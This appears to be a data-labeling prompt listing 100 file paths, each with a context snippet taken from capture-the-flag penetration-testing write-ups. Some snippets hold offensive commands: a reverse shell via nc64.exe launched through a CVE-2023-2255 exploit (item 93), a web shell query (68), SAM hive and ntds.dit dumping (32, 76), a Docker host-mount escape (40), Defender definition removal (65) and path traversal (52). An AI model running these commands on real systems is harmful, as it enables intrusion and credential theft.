@@ -1,0 +1,203 @@
+Label these 100 paths (chunk 6/15).
+Reply with one jsonl code block, one record per path, in input order.
+
+1. /devvortex.htb/do.html
+   context: 475w     6845c http://devvortex.htb/portfolio.html 200      GET      254l      520w     7603c http://devvortex.htb/do.html [####################] - 2m    120000/120000  0s      found:9       errors:0 
+2. /blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css
+   context: n is out of date, the latest version is 1.3  | [!] Directory listing is enabled  | Style URL: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css  | Style Name: Twenty Twenty-Four  | 
+3. /usr/bin/gzip
+   context: ": "Grafana backup",   "command": "/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /
+4. /var/www/only4you.htb/only4you.sock
+   context: htb;      location / {                 include proxy_params;                 proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;     } }  server {     listen 80;     server_name beta.only4you.
+5. /etc/apache2/sites-enabled
+   context: zabbix@watcher:/etc/apache2/sites-enabled$ ls 000-default.conf  watcher.vl.conf  zabbix.watcher.vl.conf
+6. C:\Users\Emily\Documents
+   context: .10.11.26  Evil-WinRM shell v3.4  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\Users\Emily\Documents>
+7. /home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.12/site-packages/bloodyAD/cli_modules/remove.py
+   context: 210, in main     output = args.func(conn, **params)              ^^^^^^^^^^^^^^^^^^^^^^^^^   File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.12/site-packages/bloodyAD/cli_modules/remove.py
+8. /home/oxdf/django/venv/bin/django-admin
+   context: all Django Found existing installation: Django 5.1.5 Uninstalling Django-5.1.5:   Would remove:     /home/oxdf/django/venv/bin/django-admin     /home/oxdf/django/venv/lib/python3.12/site-packages/Djan
+9. /localhost/images/pic02.jpg
+   context: 0309/174909.628199:VERBOSE1:network_delegate.cc(37)] NetworkDelegate::NotifyBeforeURLRequest: http://localhost/images/pic02.jpg [2385:2385:0309/174909.660855:VERBOSE1:mutable_profile_oauth2_token_serv
+10. C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
+   context: ystem32\Tasks:*" /><FilePathCondition Path="C:\Windows\System32\Tasks\*" /><FilePathCondition Path="C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter:*" /><FilePathCondition Path="C:\Windows\Syst
+11. /var/www/api/vendor/dompdf/dompdf/lib/fonts
+   context: #! /bin/bash find /var/www/api/vendor/dompdf/dompdf/lib/fonts/ -type f -cmin -5 -exec rm {} \; cp /root/font_cache/dompdf_font_family_cache.php.bak /root/font_ca
+12. C:\programdata\PowerView.ps1
+   context: ing /opt/PowerSploit/Recon/PowerView.ps1: 768kB [00:03, 262kB/s] [+] File uploaded successfully as: C:\programdata\PowerView.ps1 evil-winrm-py PS C:\programdata> . .\PowerView.ps1 evil-winrm-py PS C:\
+13. /home/bob/.cache/a.png
+   context: bob@linkvortex:/$ ln -s /home/bob/.cache/b /home/bob/.cache/a.png bob@linkvortex:/$ ls -l /home/bob/.cache/a.png lrwxrwxrwx 1 bob bob 18 Apr  8 20:58 /home/bob/.cach
+14. /root/TeamCity/buildAgent/lib/server-deployment-config.jar
+   context: TeamCity/buildAgent/lib/slf4j-api.jar:/root/TeamCity/buildAgent/lib/buildAgent-updates-applying.jar:/root/TeamCity/buildAgent/lib/server-deployment-config.jar:/root/TeamCity/buildAgent/lib/idea-settin
+15. /var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_066
+   context: file or directory (2) [2415:2418:0309/174909.487586:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_066": No such file or director
+16. /etc/bind/zones.rfc1918
+   context: //  // Consider adding the 1918 zones here, if they are not used in your // organization //include "/etc/bind/zones.rfc1918";  zone "snoopy.htb" IN {     type master;     file "/var/lib/bind/db.snoopy
+17. C:\WEBAPPS\PartImages_Staging\handlers\changePassword.ashx
+   context: C:\WEBAPPS\PartImages_Staging\handlers\changePassword.ashx
+18. C:\Windows\SysWOW64\FxsTmp
+   context: W64\com\dmp:*" /><FilePathCondition Path="C:\Windows\SysWOW64\com\dmp\*" /><FilePathCondition Path="C:\Windows\SysWOW64\FxsTmp:*" /><FilePathCondition Path="C:\Windows\SysWOW64\FxsTmp\*" /><FilePathCo
+19. /teamcity.runner.htb/admin/admin.html
+   context: oxdf@hacky$ curl 'http://teamcity.runner.htb/admin/admin.html?item=diagnostics&tab=dataDir&file=config/internal.properties' -H "Authorization: Bearer $TOKEN" ...
+20. /root/.ssh
+   context: /root/.ssh
+21. /root/TeamCity/buildAgent/lib/patches.jar
+   context: r:/root/TeamCity/buildAgent/lib/spring-expression.jar:/root/TeamCity/buildAgent/lib/spring-core.jar:/root/TeamCity/buildAgent/lib/patches.jar:/root/TeamCity/buildAgent/lib/spring-context-support.jar:/
+22. C:\Users\Sara.B\Documents
+   context: ▌ ▄▌ v1.0.0 [*] Connecting to dc01.certificate.htb:5985 as sara.b evil-winrm-py PS C:\Users\Sara.B\Documents>
+23. /sea.htb/contact.php
+   context: http://sea.htb/plugins => http://sea.htb/plugins/ 200      GET      118l      226w     2731c http://sea.htb/contact.php 301      GET        7l       20w      228c http://sea.htb/data => http://sea.htb
+24. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\313B3BF1ABEA
+   context: B3B0B2D3\0EEB3FED3C10 RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0F0FF1F01DBF RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\313B3BF1ABEA RW C:\Windows\SYSVOL\domain\
+25. C:\Users\mikasaAckerman\deskt
+   context: ----                             MD5             931386993AB32B37692FDE69E8FF389F       C:\Users\mikasaAckerman\deskt...
+26. /var/../root/.local/share
+   context: 26 19:48:36 📦 tar: Removing leading `/var/../' from member names /var/../root/ /var/../root/.local/ /var/../root/.local/share/ /var/../root/.local/share/nano/ /var/../root/.local/share/nano/search_his
+27. /furni.htb/static/css/style.css
+   context: 28l       83w     1550c http://furni.htb/login 200      GET      711l     2053w    20707c http://furni.htb/static/css/style.css 200      GET        2l      517w    31737c http://furni.htb/static/js/ti
+28. /portal.guardian.htb/models/Course.php
+   context: nments.php => http://portal.guardian.htb/login.php 200      GET        0l        0w        0c http://portal.guardian.htb/models/Course.php 200      GET        0l        0w        0c http://portal.guar
+29. /usr/bin/sqlite3
+   context: oxdf@hacky$ strings doodleGrive-cli ...[snip]... /usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line 'SELECT id,last_login,is_superuser,username,email,is_staff,is
+30. /var/www/market//etc/passwd
+   context: /var/www/market//etc/passwd
+31. /home/vagrant
+   context: h$' root:x:0:0:root:/root:/bin/bash user:x:1000:1000:user:/home/user:/bin/bash vagrant:x:1001:1001::/home/vagrant:/usr/bin/bash tom_summers:x:2001:2001::/home/tom_summers:/usr/bin/bash tom_summers_adm
+32. C:\windows\temp\SAM.save
+   context: [!] Cannot check RemoteRegistry status. Triggering start trough named pipe... [*] Saved HKLM\SAM to C:\windows\temp\SAM.save [*] Saved HKLM\SYSTEM to C:\windows\temp\SYSTEM.save [*] Saved HKLM\SECURIT
+33. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\AC2210DC311B
+   context: \scripts\A32FF3AEAA23\A3F211DCB11D RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\AADE1BA2A3E3 RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\AC2210DC311B RW C:\Windows\SYSVOL\domain\scripts\A32FF
+34. C:\Users\O.martinez\appdata\roaming\Output
+   context: PS C:\Users\O.martinez\appdata\roaming\Output Messenger\FAAA\Received Files\203301> ls      Directory: C:\Users\O.martinez\appdata\roaming\Output
+35. C:\Windows\system32\cmd.exe
+   context: CreateProcessWithLogonW() [+] Using Station\Desktop: Service-0x0-27e1f$\Default [+] Async process 'C:\Windows\system32\cmd.exe' with pid 3560 created in background.
+36. C:\Windows\System32\RuntimeBroker.exe
+   context: a_cw5n1h2txyewy\SearchUI.exe  7260  892   RuntimeBroker.exe        x64   1        HOSPITAL\drbrown  C:\Windows\System32\RuntimeBroker.exe  7316  892   RuntimeBroker.exe        x64   1        HOSPITAL\
+37. /inc/pms_settings.php
+   context: hp:              $key_qry  = "SELECT * FROM {$prefix}options where option_name='pms_encrypt_key'"; ./inc/pms_settings.php:                                                                 $query  = "SE
+38. /forms/contact.php
+   context: /forms/contact.php
+39. /includes/auth.php
+   context: <?php require '../includes/auth.php'; require '../config/db.php'; require '../models/User.php'; require '../config/csrf-tokens.php';  $
+40. /host_root/pwn.txt
+   context: er='Content-Type: application/json' \ --post-data='{"Image":"alpine","Cmd":["sh","-c","echo pwned > /host_root/pwn.txt"],"HostConfig":{"Binds":["/mnt/host/c:/host_root"]}}' \ -O - http://192.168.65.7:
+41. C:\Users\Bob.Wood
+   context: *Evil-WinRM* PS C:\Users\Bob.Wood> gci -force AppData\Roaming\Microsoft\Protect\      Directory: C:\Users\Bob.Wood\AppData\Roaming\Mi
+42. C:\Users\winrm_svc\Desktop
+   context: Saved Games d-r---        9/15/2018  12:19 AM                Videos      Directory: C:\Users\winrm_svc\Desktop  Mode                LastWriteTime         Length Name ----                ------------- 
+43. /etc/opt/chrome_for_testing/policies/managed
+   context: ir_policy_loader.cc(121)] Skipping mandatory platform policies because no policy file was found at: /etc/opt/chrome_for_testing/policies/managed [2385:2385:0309/174906.636841:VERBOSE1:config_dir_polic
+44. /var/secure-health/patients/
+   context: tens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/. It is designed to be run locally and only accepts requests with prefor
+45. /itrc.ssg.htb/api/admin.php
+   context: c.ssg.htb/api/register.php => http://itrc.ssg.htb/ 500      GET        0l        0w        0c http://itrc.ssg.htb/api/admin.php 200      GET       13l       25w      367c http://itrc.ssg.htb/assets/js
+46. /opt/SecLists/Discovery/Web-Content/common.txt
+   context: oxdf@hacky$ ffuf -u http://cybermonday.htb/assets../FUZZ -w /opt/SecLists/Discovery/Web-Content/common.txt -mc all -ac          /'___\  /'___\           /'___\               /\ \__/ /\ \__/  __  __  /
+47. C:\Users\simon.watson
+   context: 10.0.20348.3453] (c) Microsoft Corporation. All rights reserved.  shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson>
+48. /var/cache/captures
+   context: /var/cache/captures/*/[UUID].pcap
+49. /furni.htb/static/js/bootstrap.bundle.min.js
+   context: 6716c http://furni.htb/static/images/product-3.png 200      GET        6l     1029w    78080c http://furni.htb/static/js/bootstrap.bundle.min.js 200      GET      331l     2201w   186760c http://furni
+50. /var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_082
+   context: file or directory (2) [2415:2418:0309/174909.488717:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_082": No such file or director
+51. /data/script/dbstatus.json
+   context: /data/script/dbstatus.json
+52. /../../../windows/system32/drivers/etc/hosts
+   context: oxdf@hacky$ curl --negotiate -u : http://lus2dc.lustrous2.vl/File/Download?fileName=../../../../windows/system32/drivers/etc/hosts # Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS 
+53. C:\Users\winrm_svc\desktop
+   context: evil-winrm-py PS C:\Users\winrm_svc\desktop> cat user.txt e3f68cd8************************
+54. /proc/self/cwd/app.py
+   context: /proc/self/cwd/app.py
+55. C:\Users\Sara.B\Documents\WS-01\WS-01_PktMon.pcap
+   context: nrm-py PS C:\Users\Sara.B\Documents\WS-01> download WS-01_PktMon.pcap WS-01_PktMon.pcap Downloading C:\Users\Sara.B\Documents\WS-01\WS-01_PktMon.pcap: 320kB [00:00, 1.04MB/s]                          
+56. /alert.htb/index.php
+   context: created new filter; toggle off with --dont-filter 302      GET       23l       48w      660c http://alert.htb/index.php => index.php?page=alert 301      GET        9l       28w      308c http://alert.
+57. /usr/bin/dotnet
+   context: ar/lib/snapd/snap/bin  User developer may run the following commands on bagel:     (root) NOPASSWD: /usr/bin/dotnet
+58. /usr/sbin/snmptt
+   context: ios nagios 31584 Nov  9 10:42 /usr/local/nagios/bin/npcd -rwxr-xr-x 1 root root 182238 Jul 23  2020 /usr/sbin/snmptt -rwxr-xr-x 1 root root  30952 Apr  6  2021 /bin/kill -rwxr-xr-x 1 root root 30952 A
+59. /ten.vl/carousel.css
+   context: created new filter; toggle off with --dont-filter 200      GET       90l      208w     1632c http://ten.vl/carousel.css 200      GET       97l      297w     4050c http://ten.vl/signup.php 200      GET
+60. /root/TeamCity/webapps/ROOT/WEB-INF/plugins/Maven2/server/slf4j-api-1.7.36.jar
+   context: t-3.8.6.jar:/root/TeamCity/webapps/ROOT/WEB-INF/plugins/Maven2/server/plexus-interpolation-1.26.jar:/root/TeamCity/webapps/ROOT/WEB-INF/plugins/Maven2/server/slf4j-api-1.7.36.jar:/root/TeamCity/webapp
+61. \\.\pipe\oxdf
+   context: PS C:\programdata\2.0.1> $pipe = New-NtNamedPipeFile \\.\pipe\oxdf -Win32Path PS C:\programdata\2.0.1> $job = Start-Job { $pipe.Listen() } PS C:\programdata\2.0.1> $j
+62. C:\Users\gpoadm\Documents
+   context: |_|   |__/  v1.4.1  [*] Connecting to 'dc.baby2.vl:5985' as 'GPOADM' evil-winrm-py PS C:\Users\gpoadm\Documents>
+63. /usr/bin/umount
+   context: exim4 /usr/local/bin/sudo /usr/bin/passwd /usr/bin/mount /usr/bin/gpasswd /usr/bin/su /usr/bin/sudo /usr/bin/umount /usr/bin/chfn /usr/bin/chsh /usr/bin/newgrp /usr/lib/dbus-1.0/dbus-daemon-launch-hel
+64. \\cur.inf\r\nsecedit
+   context: ver\r\nwhoami /all\r\nsecedit /export /cfg C:\\windows\\tasks\\cur.inf\r\nnotepad C:\\windows\\tasks\\cur.inf\r\nsecedit /configure /db C:\\Windows\\Security\\local.sdb /cfg C:\\windows\\tasks\\cur.in
+65. \\user.txt\r\ndir\r\ncmd
+   context: ress"\r\nls \\users\\\r\ncd .\\Desktop\\\r\nnotepad root.txt\r\nnotepad C:\\Users\\mssqlsvc\\Desktop\\user.txt\r\ndir\r\ncmd /c "C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -RemoveDefinitions -
+66. /v3/tools/string/index.php
+   context: /v3/tools/string/index.php
+67. \\SQL2022-SSEI-Expr.exe\r\ncd
+   context: culture=en-us&country=us" -OutFile "C:\\Windows\\Tasks\\SQL2022-SSEI-Expr.exe"\r\nC:\\Windows\\Tasks\\SQL2022-SSEI-Expr.exe\r\ncd \\\r\ndir\r\ncd .\\SQL2022\\\r\ndir\r\ncd .\\Evaluation_ENU\\\r\ndir\r
+68. /cacti.monitorsfour.htb/cacti/shell.php
+   context: http://cacti.monitorsfour.htb/cacti/shell.php?c=id
+69. /tmp/krb5cc_50
+   context: florence.ramirez@LINUX-DEV-WS01:~$ klist Ticket cache: FILE:/tmp/krb5cc_50 Default principal: florence.ramirez@GHOST.HTB  Valid starting     Expires            Service princi
+70. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\BA3A12ADA1BB
+   context: 3DD1BCFA RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\AEE0FC3CA30F RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\BA3A12ADA1BB RW C:\Windows\S
+71. C:\Users\Administrator\AppData\Roaming\System32\clean-up.ps1
+   context: PS C:\> (get-scheduledtask -taskname cleanup).Actions  Id               :  Arguments        : -File C:\Users\Administrator\AppData\Roaming\System32\clean-up.ps1 Execute          : powershell.exe Worki
+72. /stocker.htb/img/favicon-32x32.png
+   context: 18399c http://stocker.htb/img/webp/people1.webp 200      GET        6l       21w     1354c http://stocker.htb/img/favicon-32x32.png 200      GET       20l      129w     9226c http://stocker.htb/img/ap
+73. /home/juno/shadow-simulation.sh
+   context: 2023/08/31 20:38:01 CMD: UID=1000  PID=2488   | /bin/sh -c /home/juno/shadow-simulation.sh  2023/08/31 20:38:01 CMD: UID=1000  PID=2489   | /bin/bash /home/juno/shadow-simulation.sh  2023/08
+74. C:\Users\RSA_4810\Documents
+   context: Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\RSA_4810\Documents>
+75. c:\Users\GinaWild\Desktop
+   context: c:\Users\GinaWild\Desktop>type user.txt c7de9935************************
+76. E:\Windows\ntds\
+   context: -----------------------------------    Started : Friday, September 19, 2025 11:12:24 AM    Source : E:\Windows\ntds\      Dest : C:\programdata\      Files : ntds.dit    Options : /DCOPY:DA /COPY:DAT 
+77. /var/www/dev
+   context: /var/www/dev
+78. C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials
+   context: *Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials> ls -force      Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials  Mode
+79. /var/ftp/pub/RootCA.key
+   context: ificates/generated/RootCA.crt:/var/ftp/pub/RootCA.crt"       - "./certificates/generated/RootCA.key:/var/ftp/pub/RootCA.key"     healthcheck:       test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/
+80. /qreader.htb/static/css/bootstrap.min.css
+   context: 5l       20w      153c http://qreader.htb/reader 200      GET        7l     1966w   155758c http://qreader.htb/static/css/bootstrap.min.css 200      GET      228l      638w     6992c http://qreader.ht
+81. /etc/feroxbuster/ferox-config.toml
+   context: imeout (secs)        │ 7  🦡  User-Agent            │ feroxbuster/2.10.3  💉  Config File           │ /etc/feroxbuster/ferox-config.toml  💲  Extensions            │ [php]  🏁  HTTP methods          │ [GE
+82. C:\Users\h.brown\Documents
+   context: cepter.htb  Evil-WinRM shell v3.7  Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\h.brown\Documents>
+83. /editor.htb/assets/index-DzxC4GL5.css
+   context: created new filter; toggle off with --dont-filter 200      GET        1l      477w    16052c http://editor.htb/assets/index-DzxC4GL5.css 301      GET        7l       12w      178c http://editor.htb/as
+84. /root/clean.sh
+   context: 2023/02/13 20:05:01 CMD: UID=0    PID=12453  | /bin/bash /root/clean.sh  2023/02/13 20:05:01 CMD: UID=0    PID=12452  | /bin/sh -c /root/clean.sh  2023/02/13 20:05:01 CMD:
+85. C:\Microsoft\Windows\PowerShell\StartupProfileData-Interactive
+   context: C:\Microsoft\Windows\PowerShell\StartupProfileData-Interactive
+86. /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+   context: oxdf@hacky$ ffuf -u http://10.10.11.200 -H "Host: FUZZ.interface.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --fs 6359          /'___\  /'___\           /'___\           
+87. C:\USERS\ADAM.SCOTT
+   context: il-winrm-py PS C:\Users\adam.scott> tree /f . Folder PATH listing Volume serial number is E154-392A C:\USERS\ADAM.SCOTT +---Desktop ¦       user.txt ¦        +---Documents +---Downloads +---Favorites 
+88. /localhost/assets/js/jquery.scrollex.min.js
+   context: 0309/174909.775920:VERBOSE1:network_delegate.cc(37)] NetworkDelegate::NotifyBeforeURLRequest: http://localhost/assets/js/jquery.scrollex.min.js [2415:2420:0309/174909.780227:VERBOSE1:network_delegate.
+89. /opt/backups/current/backup_manifest
+   context: PID=681834 | /usr/bin/rm -rf /opt/backups/current/PG_VERSION /opt/backups/current/backup_label /opt/backups/current/backup_manifest /opt/backups/current/base /opt/backups/current/global /opt/backups/c
+90. /furni.htb/static/images/post-3.jpg
+   context: 827047c http://furni.htb/static/images/blogs/1.jpg 200      GET      894l     5474w   514630c http://furni.htb/static/images/post-3.jpg 200      GET     1013l     5858w   458359c http://furni.htb/stat
+91. /dev/shm/configuration.php
+   context: /dev/shm/configuration.php
+92. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\2F3FCC01E0A3
+   context: \scripts\A32FF3AEAA23\23010E0A1A33 RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\2BECF3DC0B3D RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\2F3FCC01E0A3 RW C:\Windows\SYSVOL\domain\scripts\A32FF
+93. /opt/CVE-2023-2255/CVE-2023-2255.py
+   context: oxdf@hacky$ python /opt/CVE-2023-2255/CVE-2023-2255.py --cmd 'cmd.exe /c C:\ProgramData\nc64.exe -e cmd.exe 10.10.14.6 443' --output exploit.odt File expl
+94. C:\Users\liza.kazanof\Documents
+   context: Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\liza.kazanof\Documents>
+95. /opt/gavel/submission
+   context: x28);   seed_time = time((time_t *)0x0);   pid = getpid();   srand(pid ^ (uint)seed_time);   mkdir("/opt/gavel/submission",0x1e8);   listen_fd = socket(1,1,0);   if (listen_fd < 0) {     perror("socke
+96. C:\Users\bb.morgan\Desktop
+   context: *Evil-WinRM* PS C:\Users\bb.morgan\Desktop> ls      Directory: C:\Users\bb.morgan\Desktop  Mode                LastWriteTime         Length Na
+97. /tmp/pwn.so
+   context: /tmp/pwn.so
+98. /home/guests/elwin.jones/.mozilla/firefox/tr2cgmb6.default-release/lock
+   context: orateStarter04041987' scp -r elwin.jones@10.9.0.4:/home/guests/elwin.jones/.mozilla/firefox/ . scp: /home/guests/elwin.jones/.mozilla/firefox/tr2cgmb6.default-release/lock: No such file or directory
+99. /root/TeamCity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-resolver-impl-1.6.3.jar
+   context: oid.jar:/root/TeamCity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-resolver-provider-3.8.6.jar:/root/TeamCity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-resolver-impl-1.6.3.jar:/root/TeamCi
+100. /preprod-marketing.trick.htb/contact.html
+   context: http://preprod-marketing.trick.htb/contact.html
